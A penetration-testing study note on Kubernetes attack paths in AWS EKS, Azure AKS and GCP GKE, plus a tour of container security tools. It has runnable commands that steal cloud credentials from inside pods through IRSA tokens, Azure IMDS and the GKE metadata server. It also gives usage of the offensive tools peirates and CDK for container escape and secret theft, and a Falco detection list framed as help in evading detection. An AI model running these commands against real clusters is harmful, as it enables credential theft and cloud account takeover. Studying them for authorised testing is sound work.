# 04.6 — Cloud-Specific Kubernetes Attacks and Tools

## What This Note Covers

How Kubernetes attacks differ across AWS EKS, Azure AKS, and GCP GKE — focusing on the cloud IAM integrations that create unique escalation paths. Plus the complete container and Kubernetes security toolset.

---

## EKS (AWS) — IRSA and IAM Attack Paths

EKS (Elastic Kubernetes Service) integrates Kubernetes service accounts with AWS IAM via **IRSA (IAM Roles for Service Accounts)**. This lets pods assume IAM roles without node-level credentials.

### How IRSA Works

```
Pod → K8s Service Account (annotated with IAM role ARN)
    → OIDC provider (EKS issues signed JWT)
    → AWS STS AssumeRoleWithWebIdentity
    → Temporary IAM credentials
```

### Finding IRSA Misconfigurations

```bash
# List service accounts with IRSA annotations
kubectl get serviceaccounts --all-namespaces -o yaml | \
  grep "eks.amazonaws.com/role-arn"

# Get the IAM role associated with a service account
kubectl get serviceaccount SA_NAME -n NAMESPACE -o yaml
# Look for: eks.amazonaws.com/role-arn: arn:aws:iam::ACCOUNT:role/ROLE_NAME

# Check what the IAM role can do (from outside the cluster)
aws iam list-attached-role-policies --role-name ROLE_NAME
aws iam get-role --role-name ROLE_NAME  # check trust policy

# IRSA Trust Policy — should restrict to specific SA
# Misconfiguration: trust policy allows ANY service account in the cluster
{
  "Condition": {
    "StringLike": {  # LIKE instead of EQUALS = wildcard!
      "OIDC_PROVIDER:sub": "system:serviceaccount:*:*"
    }
  }
}
```

### Exploiting IRSA from Inside a Pod

```bash
# From inside a pod with an IRSA-annotated service account:
# AWS credentials are automatically injected via environment variables
env | grep AWS
# AWS_ROLE_ARN=arn:aws:iam::123456789012:role/AppRole
# AWS_WEB_IDENTITY_TOKEN_FILE=/var/run/secrets/eks.amazonaws.com/serviceaccount/token

# Use the injected token to get AWS credentials
aws sts assume-role-with-web-identity \
  --role-arn $AWS_ROLE_ARN \
  --role-session-name pod-session \
  --web-identity-token $(cat $AWS_WEB_IDENTITY_TOKEN_FILE)

# Or just use AWS CLI normally — it handles IRSA automatically
aws sts get-caller-identity  # shows the assumed role
aws s3 ls                    # uses the IAM role's permissions
```

### EKS Cluster Auth (aws-auth ConfigMap)

EKS uses a ConfigMap (`aws-auth` in `kube-system`) to map IAM users/roles to Kubernetes RBAC subjects.

```bash
# Read the aws-auth ConfigMap (requires cluster access)
kubectl get configmap aws-auth -n kube-system -o yaml

# Output shows mappings:
# mapRoles: IAM roles → K8s groups/usernames
# mapUsers: IAM users → K8s groups/usernames

# Common misconfiguration: mapping system:masters group to too many IAM entities
# system:masters = cluster-admin

# If you have IAM access and the ConfigMap maps your role:
aws eks update-kubeconfig \
  --name CLUSTER_NAME \
  --region REGION
kubectl get pods  # uses your IAM identity
```

## AKS (Azure) — Managed Identity and RBAC Integration

AKS (Azure Kubernetes Service) integrates with Azure AD for authentication and managed identities for pod-level Azure access.

### Azure AD Authentication for AKS

```bash
# Get AKS credentials (requires Azure CLI + cluster access)
az aks get-credentials \
  --resource-group RG_NAME \
  --name CLUSTER_NAME

# This writes to ~/.kube/config using Azure AD auth
kubectl get pods  # triggers Azure AD authentication

# List AKS clusters in subscription
az aks list --output table
```

### Pod Identity / Workload Identity Abuse

AKS supports workload identity (recommended) and the legacy Pod Identity (aad-pod-identity). Both let pods get Azure tokens.

```bash
# From inside a pod with a managed identity annotation:
# Get an Azure access token via IMDS
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Use the token to access Azure resources
TOKEN="eyJ0eXAi..."
curl -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"
```

### AKS RBAC — Azure RBAC vs K8s RBAC

AKS can use either Kubernetes RBAC or Azure RBAC for cluster access. Check which:

```bash
az aks show --name CLUSTER --resource-group RG \
  --query "aadProfile.enableAzureRbac"
# true → Azure RBAC controls cluster access (check Azure role assignments)
# false → Kubernetes RBAC controls access
```

## GKE (GCP) — Workload Identity and Node SA

GKE integrates with GCP IAM via Workload Identity (recommended) and legacy node service account access.

### Legacy Node SA Access (Critical Misconfiguration)

Old GKE clusters (or those not using Workload Identity) have a GCP service account on every node. Every pod can access the metadata service and steal that SA's token.

```bash
# From inside any pod on a legacy GKE cluster:
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
# Returns the NODE's service account email

curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
# Returns OAuth token — act as the NODE SA in GCP

# If the node SA is the Compute Engine default SA (roles/editor):
# You now have Editor access on the entire GCP project
```

## Container and Kubernetes Security Tools

### kube-hunter — Kubernetes Penetration Testing

```bash
# Install
pip3 install kube-hunter

# Run from outside the cluster (passive scan)
kube-hunter --remote TARGET_IP

# Run from inside the cluster (active, more findings)
kube-hunter --pod

# Run against a range
kube-hunter --cidr 10.0.0.0/24

# Output: findings categorised by severity with explanations
# Checks: open API server, kubelet API, etcd, dashboard, RBAC issues
```

### kube-bench — CIS Benchmark Compliance

```bash
# Checks cluster configuration against CIS Kubernetes Benchmark
# Run on a node (master or worker)

# Install
curl -L https://github.com/aquasecurity/kube-bench/releases/latest/download/kube-bench_linux_amd64.tar.gz | tar -xz

# Run (auto-detects master vs worker)
./kube-bench

# Specific check sets
./kube-bench --check 1.1.1  # specific CIS check
./kube-bench master          # master node checks
./kube-bench node            # worker node checks

# JSON output for parsing
./kube-bench --json output.json
```

### Trivy — Container + K8s Scanning

```bash
# Scan a Kubernetes cluster for misconfigurations
trivy k8s --report summary cluster

# Scan a specific namespace
trivy k8s --namespace production --report all cluster

# Scan infra as code (Kubernetes YAML files)
trivy config /path/to/kubernetes/manifests/

# Scan a Helm chart
trivy config ./helm-chart/

# Output includes:
# - Misconfigurations in pod specs (privileged, hostPath, etc.)
# - RBAC issues
# - Network policy gaps
# - CVEs in container images used by pods
```

### peirates — Kubernetes Attack Tool

```bash
# peirates is an offensive K8s tool — automates common attack techniques
git clone https://github.com/inguardians/peirates
cd peirates
go build .

# Run inside a pod
./peirates

# Main menu options:
# 1. Get service account tokens from all pods
# 2. Use AWS IRSA tokens
# 3. Attempt privilege escalation
# 4. Attack the API server
# 5. Get secrets
# 6. Get environment variables from all pods
```

### CDK — Container and Kubernetes Exploitation

```bash
# CDK (Container and Kubernetes Escape/Exploit)
# Detect and exploit container misconfigs + K8s attacks
wget https://github.com/cdk-team/CDK/releases/latest/download/cdk_linux_amd64
chmod +x cdk_linux_amd64

# Run inside a container — auto-detect escape paths
./cdk_linux_amd64 evaluate

# Check specific escape techniques
./cdk_linux_amd64 evaluate --full

# Exploit a specific technique
./cdk_linux_amd64 run docker-sock-check
./cdk_linux_amd64 run cgroup-escape

# Kubernetes enumeration from inside a pod
./cdk_linux_amd64 kcurl get /api/v1/secrets
```

### kubeaudit — Kubernetes Security Auditing

```bash
# Install
brew install kubeaudit  # macOS

# Audit all pods in current context
kubeaudit all

# Specific checks
kubeaudit privileged    # find privileged containers
kubeaudit image         # find containers with :latest tag
kubeaudit securitycontext  # check security contexts
kubeaudit netpols       # check network policies

# Audit a YAML manifest file
kubeaudit all -f deployment.yaml
```

### Falco — Runtime Threat Detection (Defender Awareness)

Falco monitors container runtime behaviour and alerts on suspicious activity. Knowing what Falco detects helps attackers stay under the radar.

```bash
# Falco rules that trigger on common attack techniques:
# - spawning a shell in a container
# - reading sensitive files (/etc/shadow, /etc/passwd)
# - writing to /etc
# - unexpected network connections
# - privilege escalation via setuid

# If Falco is running — check for it:
ps aux | grep falco
kubectl get pods --all-namespaces | grep falco
```
